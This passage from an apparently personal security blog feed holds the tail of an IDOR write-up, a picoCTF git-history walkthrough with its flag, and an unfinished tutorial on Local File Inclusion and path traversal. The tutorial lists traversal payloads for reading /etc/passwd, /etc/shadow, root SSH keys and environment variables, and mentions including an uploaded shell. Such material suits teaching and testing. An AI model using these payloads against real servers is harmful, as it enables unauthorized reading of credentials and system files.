<p>At first glance? Looked locked down. Couldn’t enumerate. Brute-forcing? Dead on arrival.</p>

<p>But here’s where it gets spicy.</p>

<hr />

<h4 id="create-two-accounts">Create Two Accounts</h4>

<p>Let’s say we’re testing a web app where each user has a unique UUID assigned to their profile or data page. We set up <strong>two accounts</strong>:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">StudentA</code> our real account</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">StudentB</code> a test dummy</p>
  </li>
</ul>

<p>When we visit each profile’s “view” page, the URL looks like this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Oc_jMR-1gsOIFAfaAAJCEA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>StudentA:</strong></p>

<p><code class="language-plaintext highlighter-rouge">/view/f2ffe812-4c39-4fb8-bda9-fca481a077d4</code></p>

<p><strong>StudentB:</strong></p>

<p><code class="language-plaintext highlighter-rouge">/view/2013bc6e-93b7-43a7-8ca3-27e18fedae7f</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O-FinvzrIuYZYpZZ830rJA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now here’s the test:</p>

<p>While logged in as <code class="language-plaintext highlighter-rouge">StudentA</code>, we manually change the URL to:</p>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">/view/2013bc6e-93b7-43a7-8ca3-27e18fedae7f</code></p>
</blockquote>

<p>we can now access <strong>StudentB’s content</strong>, even though it’s a different account.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aTO8BnaL4QySDxEKDYUaig.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CrlUUVyISaaMoeQv1pnWdA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<hr />

<h3 id="why-this-is-bad">Why This Is Bad</h3>

<p>This is a classic <strong>IDOR (Insecure Direct Object Reference)</strong> vuln. Even though the IDs are UUIDs (long, random, hard to guess), the backend <strong>doesn’t check</strong> if <code class="language-plaintext highlighter-rouge">StudentA</code> actually owns or has permission to view that UUID.</p>

<p>The server sees a valid ID, retrieves the data, and serves it <strong>no access control check</strong>.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Blame Game (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/intro.html" rel="alternate" type="text/html" title="Blame Game (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/intro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_angry_grizzly_bear_ascii_art_vhs_russian_underground_co_3d023849-0f23-4c2b-b670-ac5ba43f8eb1.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h2 id="description">Description</h2>

<blockquote>Someone's commits seems to be preventing the program from working. Who is it?</blockquote>

<p>They provided us with a zip file, let’s download it.</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> wget http://example.com/challenge.zip
</code></pre>
</div>

<p>Unzip this file and you got a lot of content</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>

  <pre><code class="language-bash">
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> unzip challenge.zipcode&gt;&lt;/pre&gt;
Archive:  challenge.zip
   creating: drop-in/
 extracting: drop-in/message.py
   creating: drop-in/.git/
   creating: drop-in/.git/branches/
  inflating: drop-in/.git/description
   creating: drop-in/.git/hooks/
  inflating: drop-in/.git/hooks/applypatch-msg.sample
  inflating: drop-in/.git/hooks/commit-msg.sample
  inflating: drop-in/.git/hooks/fsmonitor-watchman.sample
  inflating: drop-in/.git/hooks/post-update.sample
  inflating: drop-in/.git/hooks/pre-applypatch.sample
  inflating: drop-in/.git/hooks/pre-commit.sample
  inflating: drop-in/.git/hooks/pre-merge-commit.sample
  inflating: drop-in/.git/hooks/pre-push.sample
  inflating: drop-in/.git/hooks/pre-rebase.sample
  inflating: drop-in/.git/hooks/pre-receive.sample
  inflating: drop-in/.git/hooks/prepare-commit-msg.sample
  inflating: drop-in/.git/hooks/update.sample
   creating: drop-in/.git/info/
  inflating: drop-in/.git/info/exclude
   creating: drop-in/.git/refs/
   creating: drop-in/.git/refs/heads/
 extracting: drop-in/.git/refs/heads/master
   creating: drop-in/.git/refs/tags/
 extracting: drop-in/.git/HEAD
  inflating: drop-in/.git/config
   creating: drop-in/.git/objects/
   creating: drop-in/.git/objects/pack/
   creating: drop-in/.git/objects/info/
   creating: drop-in/.git/objects/7d/
 extracting: drop-in/.git/objects/7d/f869a15e76c28afb609fa4dbc059144ad70161
 extracting: drop-in/.git/objects/7d/0613c54635917946d70e0b2e9ca42136c18ee4
 extracting: drop-in/.git/objects/7d/1ca8dc38f8bc18eb35b2571d2b550673f2b415
   creating: drop-in/.git/objects/a5/
 extracting: drop-in/.git/objects/a5/6b2529881119591fce34630170f5630f4b096c
   creating: drop-in/.git/objects/f3/
 extracting: drop-in/.git/objects/f3/cec26cf7f80f91b5c3d1972f14dd4e9f97ec83
 extracting: drop-in/.git/objects/f3/cb1c88e58063947d16d222c68e04e62c23649e
 extracting: drop-in/.git/objects/f3/7406b0cab000c4af56ca105f0d194608e9402e
   creating: drop-in/.git/objects/32/
 extracting: drop-in/.git/objects/32/6544a21bf75fa38f486891c58119c236a7dbbf
 extracting: drop-in/.git/objects/32/a8c7430819aa9f2ca0a731f992c6cb8b09793c
 extracting: drop-in/.git/objects/32/ede878fe116a9ea9b2753fcf11543472e45035
 extracting: drop-in/.git/objects/32/a8b421e4870c094e436e3df403a243c9f61b19
 extracting: drop-in/.git/objects/32/223a970ba9986bd9caabcae02cb014381e5b42
   creating: drop-in/.git/objects/28/
 extracting: drop-in/.git/objects/28/9871add646b411282a84ff33f37abfd976ca59
 extracting: drop-in/.git/objects/28/c9a9686078224264c931276d433fd4eec66f7b
   creating: drop-in/.git/objects/9a/
 extracting: drop-in/.git/objects/9a/e3e1bc67ad0143c611c5f65399b79850d20983
   creating: drop-in/.git/objects/ce/
[SNIP]
  </code></pre>
</div>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cat drop-inmessage.py
print("Hello, World!"
</code></pre>
</div>

<p>Nothing here.</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> git log
commit 8cc3930896bb01ae046bc08c382bd30772918ff5 (HEAD -&gt; master)
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:06 2024 +0000

    important business work

commit 6dbd8d326a2f0c9fe7f0011c8e60448b9accc6ff
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:06 2024 +0000

    important business work

commit 2e8970529c41058a68aae8bc04ef7a2d53ce0d8a
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:06 2024 +0000

    important business work

commit 135020e8b96565248b604cb42ae54e256e8fc48a
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:06 2024 +0000

    important business work

commit a95fbac033f190b3fb1066727ea01d7d4be362b5
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:06 2024 +0000

    important business work

commit e6b8b174bf1ce6361ff29096579d2752616cb6f2
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:06 2024 +0000

    important business work

[SNIP]
</code></pre>
</div>

<p>Nothing here either.</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> git reflog
8cc3930 (HEAD -&gt; master) HEAD@{0}: commit: important business work
6dbd8d3 HEAD@{1}: commit: important business work
2e89705 HEAD@{2}: commit: important business work
135020e HEAD@{3}: commit: important business work
a95fbac HEAD@{4}: commit: important business work
e6b8b17 HEAD@{5}: commit: important business work
5118475 HEAD@{6}: commit: important business work
8f3c43e HEAD@{7}: commit: important business work
6701b97 HEAD@{8}: commit: important business work
8c96635 HEAD@{9}: commit: important business work
44d5213 HEAD@{10}: commit: important business work
8be10be HEAD@{11}: commit: important business work
85e253b HEAD@{12}: commit: important business work
81e3422 HEAD@{13}: commit: important business work
53ca048 HEAD@{14}: commit: important business work
1de3614 HEAD@{15}: commit: important business work
f45b2d3 HEAD@{16}: commit: important business work
0e9857c HEAD@{17}: commit: important business work
32223a9 HEAD@{18}: commit: important business work
d683b18 HEAD@{19}: commit: important business work
2c8a227 HEAD@{20}: commit: important business work
88d99c0 HEAD@{21}: commit: important business work
[SNIP]
</code></pre>
</div>

<p>Nope.</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> ls
message.py
</code></pre>
</div>

<p>Let’s use log</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> git log message.py
commit 9ae3e1bc67ad0143c611c5f65399b79850d20983
Author: picoCTF{@sk_th3_1nt3rn_yupyuyp} &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:01 2024 +0000

    optimize file size of prod code

commit f3cec26cf7f80f91b5c3d1972f14dd4e9f97ec83
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:01 2024 +0000

    create top secret project
</code></pre>
</div>

<p>The intern………</p>

<p>Thank you for reading.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Breaking Down Local File Inclusion (LFI)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/lfi.html" rel="alternate" type="text/html" title="Breaking Down Local File Inclusion (LFI)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/lfi</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/lfi.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_cosmic_black_hole_interstellar_uhd_burnedcharred_Osiris_40dc9ac1-aa11-454d-bdc4-d4a244a26d2b.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h3 id="yo-whats-up-hackers-and-learners"><strong>Yo</strong> what’s up hackers and learners</h3>

<p>Today, I wanna break down a classic web vuln that I recently got my head around: <strong>Local File Inclusion</strong>, aka <strong>LFI</strong>. If you’re diving into bug bounties, CTFs, or web pentesting just like me, this one’s a must-know. And trust me, once it clicks, it’s kinda beautiful in a terrifying way 😅.</p>

<hr />

<h4 id="-what-even-is-lfi">🧠 What Even Is LFI?</h4>

<p>Local File Inclusion is a vulnerability where a web app lets a user include files on the <strong>server</strong>, either for viewing or execution. It’s often caused by PHP that are <strong>poorly</strong> written and implemented , <strong>improper input sanitization</strong> when user-controlled data is used in file path functions like:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
&lt;?php
  include($_GET['page']);
?&gt;
</code></pre>
</div>

<p>Yup. That innocent <code class="language-plaintext highlighter-rouge">?page=about.php</code> can become something way more spicy.</p>

<h2 id="exploiting-lfi">Exploiting LFI</h2>

<p>So, we have this vulnerable web app with pages like <strong>home</strong>, <strong>about</strong>, and <strong>contact</strong>. When you look at the URLs, you’ll notice stuff like:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GVcbe5osI3RMtpW5x6pwlw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7tHOCR6_h8B2gsfOtUSxDQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
/page.php?page=pages/home.php
/page.php?page=pages/about.php
/page.php?page=pages/contact.php
</code></pre>
</div>

<p>Here’s the catch: the <code class="language-plaintext highlighter-rouge">page</code> parameter is vulnerable to <strong>Local File Inclusion (LFI)</strong>.</p>

<p>What that means is instead of just loading those normal pages, you can mess with the input and try stuff like:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
/page.php?page=../../../../../../../etc/passwd
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7GsC3N8zbCSit16vX30yVg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>you just read the server’s <strong>/etc/passwd</strong> file (if it’s a Linux box), which is a classic LFI move to prove the vulnerability exists.</p>

<p>If you’re on Windows, try:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
/page.php?page=../../../../windows/win.ini
</code></pre>
</div>

<p>Also, a sneaky trick is to check:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
/proc/self/environ
</code></pre>
</div>

<p>Sometimes that leaks environment variables, and those can be <em>juicy</em> for further attacks.</p>

<h3 id="what-is-the-risk-of-file-inclusion">What is the Risk of File Inclusion?</h3>

<p>File inclusion vulnerabilities such as <strong>Local File Inclusion (LFI)</strong> and <strong>Remote File Inclusion (RFI)</strong> can pose serious risks to a web application. At their core, they allow attackers to force the application to load and execute files they shouldn’t have access to.</p>

<h4 id="heres-why-its-dangerous">Here’s why it’s dangerous:</h4>

<ol>
  <li>
    <p><strong>Sensitive File Disclosure</strong>:
Attackers can read files on the server like:</p>

    <ul>
      <li>
        <p><code class="language-plaintext highlighter-rouge">/etc/passwd</code> (Linux user info)</p>
      </li>
      <li>
        <p>Application source code</p>
      </li>
      <li>
        <p><code class="language-plaintext highlighter-rouge">.env</code> or config files (with API keys, DB creds, etc.)</p>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Chaining to RCE</strong>:
If the attacker can upload a file (e.g., via file upload or log injection), they might include that file via LFI to <strong>execute arbitrary code</strong> turning LFI into <strong>Remote Code Execution (RCE)</strong>.</p>
  </li>
  <li>
    <p><strong>Server-Side Enumeration</strong>:
File inclusion can also allow attackers to discover internal server paths or services by brute-forcing or fuzzing local paths.</p>
  </li>
  <li>
    <p><strong>Privilege Escalation &amp; Pivoting</strong>:
In some setups, included files might inherit privileges of the web server or expose credentials that can be used to move laterally or escalate access.</p>
  </li>
</ol>

<hr />

<h3 id="real-world-example">Real-World Example:</h3>

<p>Imagine a PHP app with this line:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
include($_GET["page"]);
</code></pre>
</div>

<p>If there’s no proper validation, an attacker can do:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://target.com/index.php?page=../../../../etc/passwd
</code></pre>
</div>

<p>or</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://target.com/index.php?page=/uploads/shell.php
</code></pre>
</div>

<p>Unauthorized file access + potential RCE = major compromise</p>

<h2 id="what-is-a-path-traversal-vulnerability">What is a Path Traversal Vulnerability?</h2>

<p><strong>Path Traversal</strong> (also called <strong>Directory Traversal</strong>) is a vulnerability that allows attackers to access files and directories <strong>outside the intended scope</strong> by manipulating input parameters that reference file paths.</p>

<hr />

<h4 id="why-it-happens">Why It Happens:</h4>

<p>The vulnerability typically occurs when <strong>user input is used directly in file operations</strong> for example, reading a file using <a href="https://www.php.net/manual/en/function.file-get-contents.php"><code class="language-plaintext highlighter-rouge">file_get_contents()</code></a> in PHP <strong>without proper input validation</strong>.</p>

<h4 id="important">Important:</h4>

<p><code class="language-plaintext highlighter-rouge">file_get_contents()</code> <strong>is not inherently vulnerable</strong> the issue is when <strong>untrusted user input</strong> is passed directly into it.</p>

<h3 id="what-does--really-mean">What Does ../../../../ Really Mean?</h3>

<p><strong>Path Traversal</strong>, also known as the <strong>“dot-dot-slash” (../)</strong> attack, is a technique where an attacker manipulates file paths to <strong>move up the directory structure</strong> and access files that should be off-limits.</p>

<h4 id="how-it-works">How It Works:</h4>

<p>In many operating systems, <code class="language-plaintext highlighter-rouge">../</code> means “go up one directory.” By chaining multiple <code class="language-plaintext highlighter-rouge">../</code>, attackers can escape the intended folder and reach <strong>sensitive system or application files</strong>.</p>

<h4 id="how--works">how ../../../../ Works</h4>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
# Create a demo directory structure
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> mkdir -p /tmp/demo/var/www/html/uploads
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd /tmp/demo/var/www/html/uploads

# Show current path
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> pwd

# Go up one directory
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd ..

# Go up two more directories
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd ../..

# Go back to the demo root
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd ../../../../

# Create a fake sensitive file
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> echo "root:x:0:0:root:/root:/bin/bash" &gt; etc_passwd

# Simulate a path traversal to access the file
<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cat var/www/html/uploads/../../../../etc_passwd
  </code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DBNnmwsgX5ix3bLFOWVBBQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h3 id="bypassing-filters-in-lfipath-traversal-know-your-target-files">Bypassing Filters in LFI/Path Traversal Know Your Target Files</h3>

<p>Sometimes, devs try to protect against file inclusion or path traversal by filtering out obvious payloads. But if you’re testing an app, knowing <strong>which OS-level files to target</strong> can help you validate vulnerabilities, bypass weak filters, or escalate further.</p>

<p>Below are some <strong>commonly accessed system files</strong> on Linux and Windows that can leak juicy info:</p>

<hr />

<h3 id="linux-targets"><strong>Linux Targets</strong></h3>

<table>
  <thead>
    <tr>
      <th>Location</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/etc/issue</code></td>
      <td>Displays the system’s pre-login message or banner. Can reveal OS flavor/version.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/etc/profile</code></td>
      <td>Defines global environment variables (e.g., <code class="language-plaintext highlighter-rouge">PATH</code>, <code class="language-plaintext highlighter-rouge">umask</code>) applies to all users.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/proc/version</code></td>
      <td>Contains the Linux kernel version useful for kernel-based exploits.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/etc/passwd</code></td>
      <td>Lists all local users. Doesn’t store passwords (that’s <code class="language-plaintext highlighter-rouge">/etc/shadow</code>).</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/etc/shadow</code></td>
      <td>Stores hashed passwords for user accounts (root access required). Goldmine for cracking.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/root/.bash_history</code></td>
      <td>Shows commands run by the root user often reveals passwords, configs, etc.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/dmesg</code></td>
      <td>Contains kernel ring buffer messages useful for debugging hardware and system info.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/mail/root</code></td>
      <td>Stores root’s local email might contain alerts, logs, or tool output.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code></td>
      <td>Root’s private SSH key compromise this = full system access.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/apache2/access.log</code></td>
      <td>Shows every request to the Apache server. Great for <strong>log poisoning</strong> or recon.</td>
    </tr>
  </tbody>
</table>

<hr />

<h3 id="windows-targets"><strong>Windows Targets</strong></h3>

<table>
  <thead>
    <tr>
      <th>Location</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">C:\boot.ini</code></td>
      <td>Legacy file for boot config on BIOS-based systems. Leaks OS and bootloader info.</td>
    </tr>
  </tbody>
</table>

<h2 id="black-box-lfi-testing-with-null-byte-injection">Black Box LFI Testing with Null Byte Injection</h2>

<p>When you don’t have any info about a web application (black box testing), you have to start by probing it with random inputs for example, using the <code class="language-plaintext highlighter-rouge">lang</code> parameter with some random value like <code class="language-plaintext highlighter-rouge">hello</code>.</p>

<p>Say you have this URL:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
pagebypassnulbyte.php?lang=EN
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HOYCSmUmIPOG80h14MWIlw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0YEJHBsxjODRJ0dbY00VPg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>You can change the language from English to Spanish or any other supported language by modifying the <code class="language-plaintext highlighter-rouge">lang</code> parameter.</p>

<h4 id="step-1-recon-sending-a-random-input">Step 1: Recon Sending a Random Input</h4>

<p>Let’s first send a random input, like <code class="language-plaintext highlighter-rouge">hello</code>, to see how the app responds:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
